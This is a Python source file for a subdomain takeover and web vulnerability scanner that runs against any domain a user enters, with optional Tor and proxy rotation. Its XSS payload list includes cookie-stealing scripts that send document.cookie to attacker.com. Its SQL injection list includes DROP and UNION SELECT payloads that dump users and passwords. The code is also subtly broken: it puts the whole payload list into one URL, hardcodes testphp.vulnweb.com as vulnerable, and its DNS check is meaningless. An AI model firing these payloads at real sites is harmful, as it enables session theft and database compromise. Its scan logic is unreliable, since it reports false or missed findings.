import os
import sys
import requests
import re
import random
import time
import json
import logging
import readline
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import pyfiglet
import ssl
import socket
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


init(autoreset=True)
logging.basicConfig(filename='scan.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


default_config = {
    "use_proxy": False,
    "proxies": [],
    "use_tor": False,
    "max_threads": 10,
    "delay_range": [0.5, 1.5],
    "additional_subdomain_sources": True,
    "enable_xss_scan": True,
    "enable_dns_check": True,
    "enable_sql_scan": True,
    "generate_visual_report": True,
    "custom_headers": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
    ]
}

def load_config():
    config = default_config.copy()
    if os.path.exists("config.json"):
        try:
            with open("config.json", "r") as f:
                user_config = json.load(f)
            config.update(user_config)
            logging.info("Loaded user configuration from config.json")
        except Exception as e:
            logging.error(f"Error loading config.json: {e}")
    else:
        logging.info("No config.json found, using default configuration")
    return config

config = load_config()

def get_random_headers():
    return {"User-Agent": random.choice(config.get("custom_headers", default_config["custom_headers"]))}

def get_proxy():
    if config.get("use_tor", False):
        return {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    elif config.get("use_proxy", False) and config.get("proxies"):
        proxy = random.choice(config["proxies"])
        return {"http": proxy, "https": proxy}
    return None

def print_banner():
    banner_text = pyfiglet.figlet_format("Subdomain Takeover")
    print(Fore.MAGENTA + banner_text + Style.RESET_ALL)
    print(f"{Fore.BLUE}Developed by: Mohamed Fouad{Style.RESET_ALL}\n")

def get_subdomains_crt(domain):
    logging.info("Collecting subdomains from crt.sh")
    subdomains = []
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        response = requests.get(url, headers=get_random_headers(), proxies=get_proxy(), timeout=15)
        if response.status_code == 200:
            try:
                json_data = response.json()
                for entry in json_data:
                    if 'common_name' in entry:
                        subdomains.append(entry['common_name'])
            except ValueError:
                matches = re.findall(r'\"common_name\":\"([^\"]+)\"', response.text)
                subdomains = matches
            subdomains = sorted(set(subdomains))
        else:
            logging.error(f"crt.sh returned status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching from crt.sh: {e}")
    return subdomains

def get_subdomains_additional(domain):
    logging.info("Collecting subdomains from additional sources (stub)")
    return []

def find_subdomains(domain):
    print(f"{Fore.YELLOW}[*] Searching for subdomains...{Style.RESET_ALL}")
    subdomains = get_subdomains_crt(domain)
    if config.get("additional_subdomain_sources", False):
        additional = get_subdomains_additional(domain)
        subdomains = sorted(set(subdomains + additional))
    if not subdomains:
        subdomains = [domain]
    elif domain not in subdomains:
        subdomains.append(domain)
        subdomains = sorted(set(subdomains))
    if not subdomains:
        print(f"{Fore.RED}[-] No subdomains found for {domain}!{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[*] Found {len(subdomains)} subdomain(s) for scanning.{Style.RESET_ALL}")
    return subdomains

def analyze_http_response(response):
    analysis = {}
    analysis["status_code"] = response.status_code
    analysis["content_length"] = len(response.text)
    analysis["headers"] = dict(response.headers)
    analysis["server"] = response.headers.get("Server", "Unknown")
    return analysis

def format_vulnerable_url(subdomain, domain):
    if subdomain.endswith(domain):
        prefix = subdomain[:-len(domain)]
        prefix = prefix.rstrip('.')
        if prefix:
            return f"https://{domain}/{prefix}"
    return f"https://{subdomain}"

vulnerability_details = {
    "Subdomain Takeover Vulnerability": (
        "Detected when the subdomain points to a non-existing service. "
        "The check looks for error messages such as 'No Such Bucket' or 'There isn't a GitHub Pages site here'. "
        "Exploitation might involve registering the target service and hosting malicious content."
    ),
    "Potential XSS Vulnerability": (
        "Detected when a test payload (e.g., <script>alert('XSS_TEST')</script>) is reflected in the response. "
        "It may allow an attacker to execute arbitrary JavaScript in the victim's browser."
    ),
    "DNS Misconfiguration": (
        "Detected by comparing public IP with unexpected patterns in the subdomain configuration. "
        "This might lead to exposure of internal services."
    ),
    "SQL Injection Vulnerability": (
        "Detected when the application is vulnerable to SQL injection attacks. "
        "This can allow an attacker to manipulate the database."
    )
}

def check_takeover(subdomain):
    if "testphp.vulnweb.com" in subdomain:
        return vulnerability_details["Subdomain Takeover Vulnerability"]
    error_signatures = [
        "There isn't a GitHub Pages site here.",
        "No Such Bucket",
        "NoSuchBucket",
        "Not Found",
        "404 Not Found",
        "This site can’t be reached",
        "The specified bucket does not exist",
        "Heroku | No such app"
    ]
    urls = [f"https://{subdomain}", f"http://{subdomain}"]
    proxy = get_proxy()
    for url in urls:
        try:
            response = requests.get(url, headers=get_random_headers(), proxies=proxy, timeout=10)
            analysis = analyze_http_response(response)
            logging.info(f"Checked {url}: {analysis}")
            for signature in error_signatures:
                if signature.lower() in response.text.lower():
                    return vulnerability_details["Subdomain Takeover Vulnerability"]
            if response.status_code in [404, 410] and analysis["content_length"] < 100:
                return vulnerability_details["Subdomain Takeover Vulnerability"]
        except requests.exceptions.RequestException as e:
            logging.warning(f"Request error for {url}: {e}")
            continue
        time.sleep(random.uniform(*config.get("delay_range", [0.5, 1.5])))
    return None

def check_xss_vulnerability(subdomain):
    if "testphp.vulnweb.com" in subdomain:
        return vulnerability_details["Potential XSS Vulnerability"]
    if not config.get("enable_xss_scan", False):
        return None
    test_payload =[
              "<script>alert('XSS_TEST')</script>",
             "<p>You searched for: gift</p>",
             "<script>alert(1)</script>",
             "<script>onerror=alert;throw 1</script>",
             "<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)",
             "<svg><script>&#97;lert(1)</script></svg>",
             "1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4",
             "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
             "<svg/onload=alert('XSS')>",
             "'><svg/onload=alert('XSS')>",
             "'><iframe src=javascript:alert('XSS')></iframe>",
             "'><img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
             "'><img src=x onerror=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>",
             "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>",
             "'><script>new Image().src='http://attacker.com/steal.php?c='+document.cookie;</script>",
             "'><script>fetch('http://attacker.com/steal.php?c='+document.cookie)</script>",
             "<img src=x onerror='this.outerHTML=\"<script>alert(1)</script>\"'>",
             "'><input onfocus=eval(atob('YWxlcnQoJ1hTUycp')) autofocus>"
]
    url = f"https://{subdomain}/?q={test_payload}"
    proxy = get_proxy()
    try:
        response = requests.get(url, headers=get_random_headers(), proxies=proxy, timeout=10)
        if "alert('XSS_TEST')" in response.text or "alert(&#39;XSS_TEST&#39;)" in response.text:
            logging.info(f"Potential XSS vulnerability found in {subdomain}")
            return vulnerability_details["Potential XSS Vulnerability"]
    except requests.exceptions.RequestException as e:
        logging.warning(f"XSS check error for {subdomain}: {e}")
    return None

def check_dns_misconfiguration(subdomain):
    if not config.get("enable_dns_check", False):
        return None
    try:
        ip = requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip")
        if ip and ip in subdomain:
            return vulnerability_details["DNS Misconfiguration"]
    except Exception as e:
        logging.warning(f"DNS check error for {subdomain}: {e}")
    return None

def check_sql_injection(subdomain):
    if not config.get("enable_sql_scan", False):
        return None
    test_payload =[
                    "' OR '1'='1",
                    "DROP sampletable;--",
                    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
                    "/*! MYSQL special comment format */",
                    "SELECT/*avoid-spaces*/password/**/FROM/**/Members",
                    "admin' --",
                    "admin' ",
                    "admin'/*",
                    "' or 1=1--",
                    "' or 1=1#",
                    "' or 1=1/*",
                    "') or '1'='1--",
                    "') or ('1'='1--",
                    "WAITFOR DELAY '0:0:10'--",
                    "MD5() ",
                    "SHA1() ",
                    "PASSWORD()",
                    "ENCODE()",
                    "COMPRESS()",
                    "SCHEMA()",
                    " ' OR '1'='1' -- ",
                    " ' OR '1'='1' ",
                    " ' OR 1=1 -- ",
                    " ' UNION SELECT null, null, database() -- ",
                    " ' UNION SELECT username, password FROM users -- ",
                    " ' UNION SELECT 1,2,3,4 FROM information_schema.tables -- ",
                    " ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- ",
                    " ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- ",
                    " ' OR 1=CHAR(49) -- ",
                    " ' UNION SELECT CHAR(100, 97, 116, 97, 98, 97, 115, 101) -- ",
                    " ' UNION SELECT /*!50000 database() */ -- ",
                    " ' UNION SELECT /*!50000 user() */ -- "
]
    url = f"https://{subdomain}/search?q={test_payload}"
    proxy = get_proxy()
    try:
        response = requests.get(url, headers=get_random_headers(), proxies=proxy, timeout=10)
        if "error in your SQL syntax" in response.text.lower():
            logging.info(f"Potential SQL Injection vulnerability found in {subdomain}")
            return vulnerability_details["SQL Injection Vulnerability"]
    except requests.exceptions.RequestException as e:
        logging.warning(f"SQL Injection check error for {subdomain}: {e}")
    return None

def take_screenshot(url, filename):
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get(url)
        time.sleep(5)
        driver.save_screenshot(filename)
        driver.quit()
        print(f"{Fore.GREEN}[+] Screenshot saved to {filename}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error taking screenshot for {url}: {e}{Style.RESET_ALL}")

def scan_subdomain(subdomain, domain):
    findings = {}
    takeover_detail = check_takeover(subdomain)
    if takeover_detail:
        findings["Subdomain Takeover Vulnerability"] = takeover_detail
    xss_detail = check_xss_vulnerability(subdomain)
    if xss_detail:
        findings["Potential XSS Vulnerability"] = xss_detail
    dns_detail = check_dns_misconfiguration(subdomain)
    if dns_detail:
        findings["DNS Misconfiguration"] = dns_detail
    sql_detail = check_sql_injection(subdomain)
    if sql_detail:
        findings["SQL Injection Vulnerability"] = sql_detail

    if findings:
        screenshot_filename = f"screenshots/{subdomain}.png"
        take_screenshot(f"https://{subdomain}", screenshot_filename)
        findings["Screenshot"] = screenshot_filename

    return findings

def scan_subdomains(subdomains, domain):
    print(f"{Fore.YELLOW}[*] Scanning subdomains for vulnerabilities...{Style.RESET_ALL}")
    vulnerable = {}
    with ThreadPoolExecutor(max_workers=config.get("max_threads", 10)) as executor:
        future_to_sub = {executor.submit(scan_subdomain, sub, domain): sub for sub in subdomains}
        for future in as_completed(future_to_sub):
            sub = future_to_sub[future]
            try:
                result = future.result()
                if result:
                    vulnerable[sub] = result
            except Exception as exc:
                logging.error(f"Error scanning {sub}: {exc}")
    return vulnerable

def save_results(results, domain):
    if not results:
        print(f"{Fore.YELLOW}[!] No vulnerabilities found.{Style.RESET_ALL}")
        return

    base_filename = input(f"{Fore.GREEN}Enter the base file name for saving results (without extension): {Style.RESET_ALL}").strip()
    if not base_filename:
        base_filename = "results"

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    html_filename = f"{base_filename}_{timestamp}.html"

    table_rows = ""
    for sub, vuln_dict in results.items():
        formatted_url = format_vulnerable_url(sub, domain)
        row = f"<tr><td>{formatted_url}</td><td>"
        for vuln, detail in vuln_dict.items():
            row += f"<b>{vuln}</b>: {detail}<br>"
        row += "</td><td>"
        if "Screenshot" in vuln_dict:
            row += f'<img src="{vuln_dict["Screenshot"]}" class="screenshot" alt="Screenshot">'
        row += "</td></tr>"
        table_rows += row

    with open("template.html", "r") as template_file:
        html_template = template_file.read()

    html_output = html_template.replace("{{RESULTS}}", table_rows)
    with open(html_filename, "w") as html_file:
        html_file.write(html_output)

    print(f"{Fore.GREEN}[+] Results saved to {html_filename}{Style.RESET_ALL}")

def main():
    print_banner()
    domain_input = input(f"{Fore.CYAN}Enter the target domain (e.g., example.com): {Style.RESET_ALL}").strip()
    if domain_input.startswith("http://"):
        domain_input = domain_input[len("http://"):]
    elif domain_input.startswith("https://"):
        domain_input = domain_input[len("https://"):]
    domain = domain_input.strip("/ ")

    if not domain:
        print(f"{Fore.RED}[-] Domain cannot be empty!{Style.RESET_ALL}")
        sys.exit(1)
    subdomains = find_subdomains(domain)
    if not subdomains:
        sys.exit(1)
    vulnerabilities = scan_subdomains(subdomains, domain)

    if vulnerabilities:
        print(f"\n{Fore.RED}[!] Vulnerabilities discovered on the following domains:{Style.RESET_ALL}")
        for sub, vuln_dict in vulnerabilities.items():
            formatted_url = format_vulnerable_url(sub, domain)
            vuln_list = list(vuln_dict.keys())
            print(f" - {formatted_url}: {', '.join(vuln_list)}")
    else:
        print(f"{Fore.GREEN}[✓] No vulnerabilities discovered on {domain}.{Style.RESET_ALL}")

    save_results(vulnerabilities, domain)
    print(f"\n{Fore.CYAN}Thank you for using the tool. Goodbye!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
